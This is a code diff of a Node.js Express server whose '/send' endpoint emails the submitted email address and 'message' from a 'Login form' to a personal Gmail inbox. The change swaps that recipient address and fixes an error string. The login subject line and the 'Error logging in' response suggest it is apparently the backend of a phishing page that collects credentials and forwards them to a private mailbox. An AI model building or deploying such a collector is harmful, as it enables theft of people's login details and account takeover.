@@ -26,7 +26,7 @@ app.post('/send', async (req, res) => {
   try {
     await resend.emails.send({
       from: "NoReply <onboarding@resend.dev>",   // Resend test sender
-      to: "glowemeka@gmail.com",           // Replace with your personal inbox
+      to: "tykeshare@gmail.com",           // Replace with your personal inbox
       subject: `Login from ${email}`,
       text: `You received a new message from the Login form.\n\nSender email: ${email}\n\nMessage:\n${message}`,
       reply_to: email // lets you reply directly to the person who filled the form
@@ -35,11 +35,12 @@ app.post('/send', async (req, res) => {
     res.json({ success: true });
   } catch (err) {
     console.error(err);
-    res.status(500).json({ error: 'Error loggin in' });
+    res.status(500).json({ error: 'Error logging in' });
   }
 });
 
 // ✅ Only one app.listen, uses Render's PORT
 const PORT = process.env.PORT || 5000;
 app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
+
 
